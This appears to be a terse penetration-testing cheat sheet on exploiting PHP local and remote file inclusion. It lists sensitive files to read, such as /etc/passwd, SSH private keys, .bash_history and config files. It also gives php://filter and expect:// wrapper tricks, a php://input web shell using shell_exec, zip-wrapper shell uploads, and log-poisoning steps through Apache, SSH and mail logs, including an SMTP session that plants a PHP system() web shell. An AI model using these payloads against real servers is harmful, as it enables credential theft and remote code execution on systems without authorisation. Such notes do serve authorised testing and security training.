## LFI/RFI
Exploiting PHP File Inclusion – Overview
https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/

Add %00 to test if the file is adding .php to the filename < before php version 5.3
Add ? to act as another parameter

include will execute the file. Others will not

## Local File inclusion
$file = $_GET['page'];
require($file);

check with files that generally can be accessed
/etc/passwd
/etc/hostname
/etc/hosts

read php file
php://filter/convert.base64-encode/resource=<file name/Path> e.g. index
echo "<output>" |base64 -d

.htaccess
config.php in web root folder?

root/user ssh keys? .bash_history?
/.ssh/id_rsa
/.ssh/id_rsa.keystore
/.ssh/id_rsa.pub
/.ssh/authorized_keys
/.ssh/known_hosts

php Wrapper  
expect://<command>  

page=php://input&cmd=ls  
in POST request  
<?php echo shell_exec($GET_['cmd']);?>  

Upload Zip shell file and extract with zip  
zip://path/to/file.zip%23shell  
zip://path/to/file.zip%23shell.php  

Check current running user  
/proc/self/status  
check uid and gid  

### Log Poisoning  
https://wiki.apache.org/httpd/DistrosDefaultLayout  
**Common log file location**  
**Ubuntu, Debian**  
/var/log/apache2/error.log  
/var/log/apache2/access.log  

**Red Hat, CentOS, Fedora, OEL, RHEL**  
/var/log/httpd/error_log  
/var/log/httpd/access_log  
  
**FreeBSD**  
/var/log/httpd-error.log  
/var/log/httpd-access.log  

**Common Config file location**  
check any restriction or hidden path on accessing the server  

**Ubuntu**  
/etc/apache2/apache2.conf  

/etc/apache2/httpd.conf  
/etc/apache2/apache2.conf  
/etc/httpd/httpd.conf  
/etc/httpd/conf/httpd.conf  

**FreeBSD**  
/usr/local/etc/apache2/httpd.conf  

Hidden site?  
/etc/apache2/sites-enabled/000-default.conf  

proc/self/environ  
https://www.exploit-db.com/papers/12886/  
/proc/self/environ  

### SSH log posioning  
http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/  

### Mail log  
telnet <IP> 25  
EHLO <random character>  

VRFY <user>@localhost  

mail from:attacker@attack.com  
rcpt to: <user>@localhost  
data  

Subject: title  
<?php echo system($_REQUEST['cmd']); ?>  

<end with .>  

LFI /var/mail/<user>  

## Remote File Inclusion  
requires allow_url_fopen=On and allow_url_include=On  

$incfile = $_REQUEST["file"];  
include($incfile.".php");  

